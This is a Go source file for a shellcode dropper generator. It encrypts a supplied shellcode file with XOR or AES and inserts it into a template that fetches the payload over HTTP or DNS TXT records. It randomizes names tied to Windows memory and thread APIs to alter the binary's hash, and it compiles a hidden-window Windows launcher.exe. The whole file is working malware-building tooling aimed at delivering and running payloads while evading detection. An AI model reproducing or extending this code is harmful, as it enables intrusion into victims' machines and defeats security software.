package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"flag"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"strings"

	log "github.com/sirupsen/logrus"
)

const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

func BuildPayload() {
	log.Info("Building payload for windows target")

	arg0 := "go"
	arg1 := "build"
	arg2 := "-ldflags"
	arg3 := "-H=windowsgui"
	arg5 := "-o=launcher.exe"
	arg7 := "tmp.go"

	cmd := exec.Command(arg0, arg1, arg2, arg3, arg5, arg7)

	cmd.Env = os.Environ()
	cmd.Env = append(cmd.Env, "GOOS=windows")
	cmd.Env = append(cmd.Env, "GOARCH=amd64")

	var out bytes.Buffer
	var stderr bytes.Buffer

	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		log.Error(stderr.String())
		return
	}

	log.Info("Binary written to launcher.exe")
}

func StringInSlice(a string, list []string) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}

	return false
}

func RandStringBytes(n int) string {
	b := make([]byte, n)

	for i := range b {
		b[i] = ALPHABET[rand.Intn(len(ALPHABET))]
	}

	return string(b)
}

func AESKeyPadding(byte_array []byte) []byte {
	if len(byte_array) == 32 {
		return byte_array
	} else {
		if len(byte_array) < 32 {
			bytes_to_add := 32 - len(byte_array)

			for i := 0; i < bytes_to_add; i++ {
				byte_array = append(byte_array, byte('A'))
			}

			return byte_array
		} else {
			byte_array = byte_array[0:32]
		}

		return byte_array
	}
}

func PlaintextB64Encode(shellcode_file string) string {
	log.Info("Not performing any encryption. Encoding the file.")

	plaintext, _ := ioutil.ReadFile(shellcode_file)

	plaintext_b64 := base64.StdEncoding.EncodeToString([]byte(plaintext))

	log.Info("Generated encoded text: " + plaintext_b64)

	return plaintext_b64
}

func EncryptAES(shellcode_file string, key string) string {
	log.Info("Performing AES encryption on file " + shellcode_file + " using key: " + key)

	plaintext, _ := ioutil.ReadFile(shellcode_file)
	key_byte := []byte(key)

	c, err := aes.NewCipher(key_byte)
	if err != nil {
		log.Error(err)
	}

	IV := []byte("1234567812345678")

	stream := cipher.NewCTR(c, IV)
	stream.XORKeyStream(plaintext, plaintext)
	ciphertext := plaintext

	ciphertext_b64 := base64.StdEncoding.EncodeToString(ciphertext)

	log.Info("Generated encoded text: " + ciphertext_b64)

	return ciphertext_b64
}

func EncryptXOR(shellcode_file string, key string) string {
	log.Info("Performing XOR encryption on file " + shellcode_file + " using key: " + key)

	plaintext, _ := ioutil.ReadFile(shellcode_file)
	key_byte := []byte(key)

	ciphertext := make([]byte, len(plaintext))

	for i := 0; i < len(plaintext); i++ {
		ciphertext[i] = plaintext[i] ^ key_byte[i%len(key_byte)]
	}

	ciphertext_b64 := base64.StdEncoding.EncodeToString([]byte(ciphertext))

	log.Info("Generated ciphertext: " + ciphertext_b64)

	return ciphertext_b64
}

func CopyFile(src, dest string) {
	input, err := ioutil.ReadFile(src)
	if err != nil {
		log.Fatalln(err)
	}

	err = ioutil.WriteFile(dest, input, 0644)
	if err != nil {
		log.Fatalln(err)
	}
}

func ReplaceStringInFile(file_path, string_to_replace, string_to_put string) {
	input, err := ioutil.ReadFile(file_path)
	if err != nil {
		log.Fatalln(err)
	}

	lines := strings.Split(string(input), "\n")

	for i, line := range lines {
		if strings.Contains(line, string_to_replace) {
			lines[i] = strings.Replace(lines[i], string_to_replace, string_to_put, -1)
		}
	}
	output := strings.Join(lines, "\n")
	err = ioutil.WriteFile(file_path, []byte(output), 0644)
	if err != nil {
		log.Fatalln(err)
	}
}

func PopulateTemplate(src_file_path, crypter_mode, download_mode, download_src, execution_mode, key, randomizer string, debug bool) {
	log.Info("Performing template variable insertion")

	if debug {
		ReplaceStringInFile(src_file_path, "{{DEBUG}}", "true")
	} else {
		ReplaceStringInFile(src_file_path, "{{DEBUG}}", "false")
	}

	ReplaceStringInFile(src_file_path, "{{CRYPTER_MODE}}", crypter_mode)
	ReplaceStringInFile(src_file_path, "{{DOWNLOAD_MODE}}", download_mode)
	ReplaceStringInFile(src_file_path, "{{EXECUTION_MODE}}", execution_mode)
	ReplaceStringInFile(src_file_path, "{{KEY}}", key)
	ReplaceStringInFile(src_file_path, "{{RANDOMIZER}}", randomizer)
	ReplaceStringInFile(src_file_path, "{{DOWNLOAD_SRC}}", download_src)
}

func RandomizeVariables(variable_templatized_names []string) {
	log.Info("Randomizing select variable names")

	for i := 0; i < len(variable_templatized_names); i++ {
		new_var_name := RandStringBytes(12)

		ReplaceStringInFile("./tmp.go", variable_templatized_names[i], new_var_name)
	}
}

func main() {
	var crypter_mode string
	var download_mode string
	var execution_mode string
	var shellcode_file string
	var download_src string
	var debug bool

	flag.StringVar(&crypter_mode, "crypter_mode", "xor", "The encryption mode to use for the shellcode (xor, aes, none). Default: xor")
	flag.StringVar(&download_mode, "download_mode", "http", "The method to use for downloading the payload (http, dns, none). Default: http")
	flag.StringVar(&download_src, "download_src", "", "The URL that will point to the payload (for http) or the domain name with the TXT record containing the payload (for dns).")
	flag.StringVar(&execution_mode, "execution_mode", "1", "The method to use for execution of the shellcode. This is a numerical value. See README for detailed explanation of modes.")
	flag.StringVar(&shellcode_file, "shellcode_file", "", "The path and filename for the file containing the binary shellcode to be executed by the launcher")
	flag.BoolVar(&debug, "debug", true, "Place the payload in debug mode (true/false).")

	flag.Parse()

	crypter_mode = strings.ToLower(crypter_mode)
	download_mode = strings.ToLower(download_mode)
	execution_mode = strings.ToLower(execution_mode)
	download_src = strings.ToLower(download_src)

	log.SetFormatter(&log.JSONFormatter{})
	log.SetLevel(log.InfoLevel)

	var crypter_modes = []string{"aes", "xor", "none"}
	var download_modes = []string{"http", "dns", "none"}
	var execution_modes = []string{"1"}
	var templatized_variables_to_randomize = []string{"{{MEM_COMMIT}}", "{{MEM_RESERVE}}", "{{PAGE_EXECUTE_READ}}", "{{PAGE_READWRITE}}", "{{KERNEL_32}}", "{{NTDLL}}", "{{VIRTUAL_ALLOC}}", "{{VIRTUAL_PROTECT}}", "{{RTL_COPY_MEMORY}}", "{{CREATE_THREAD}}", "{{WAIT_FOR_SINGLE_OBJECT}}", "{{TMP_ADDRESS}}", "{{TMP_PROTECT}}", "{{THREAD}}"}
	var key string
	var ciphertext_b64 string

	log.Info(crypter_mode)

	// validate modes
	if StringInSlice(crypter_mode, crypter_modes) {
		log.Info("Crypter mode is valid.")
	} else {
		log.Info("Crypter mode is invalid.")
		os.Exit(3)
	}

	if StringInSlice(download_mode, download_modes) {
		log.Info("Download mode is valid.")
	} else {
		log.Info("Download mode is invalid.")
		os.Exit(3)
	}

	if StringInSlice(execution_mode, execution_modes) {
		log.Info("Execution mode is valid.")
	} else {
		log.Info("Execution mode is invalid.")
		os.Exit(3)
	}

	// validate path to shellcode file
	if _, err := os.Stat(shellcode_file); err == nil {
		log.Info("Shellcode file exists.")
	} else {
		log.Error("Shellcode file does not exist. Exiting.")
		os.Exit(3)
	}

	// if encryption mode, generate random key, print to console
	key = RandStringBytes(32)

	// encrypt shellcode using algorithm selected and key, or don't if none
	if crypter_mode == "xor" {
		ciphertext_b64 = EncryptXOR(shellcode_file, key)
	} else if crypter_mode == "aes" {
		ciphertext_b64 = EncryptAES(shellcode_file, key)
	} else {
		ciphertext_b64 = PlaintextB64Encode(shellcode_file)
	}

	// output base64 ciphertext to file, print path and truncated contents
	output_file_path := "./shellcode_ciphertext.b64.out"

	f, err := os.Create(output_file_path)
	if err != nil {
		log.Fatal(err)
	}

	defer f.Close()

	_, err2 := f.WriteString(ciphertext_b64)
	if err2 != nil {
		log.Fatal(err2)
	}

	log.Info("Wrote base64 encoded ciphertext payload to: " + output_file_path)

	// based on other selections, select template
	// insert remaining data into templates
	// create randomization string, insert into template
	randomizer := RandStringBytes(12)

	template_file := "./templates/template.go"
	tmp_go_file := "./tmp.go"

	CopyFile(template_file, tmp_go_file)

	PopulateTemplate(tmp_go_file, crypter_mode, download_mode, download_src, execution_mode, key, randomizer, debug)

	// randomize variables
	RandomizeVariables(templatized_variables_to_randomize)

	// generate binary
	BuildPayload()

	log.Info("Payload/dropper generation complete")

	if debug == true {
		log.Info("Crypter mode: " + crypter_mode)
		log.Info("Download mode: " + download_mode)
		log.Info("Execution mode: " + execution_mode)
		log.Info("Download source: " + download_src)
		log.Info("Shellcode file: " + shellcode_file)
		log.Info("Key: " + key)
		log.Info("Template file: " + template_file)
		log.Info("Final dropper Go file (not deleted due to debug mode): " + tmp_go_file)
		log.Info("Randomization (hash adjustment) string: " + randomizer)
	} else {
		// delete tmp file
		os.Remove(tmp_go_file)
	}
}
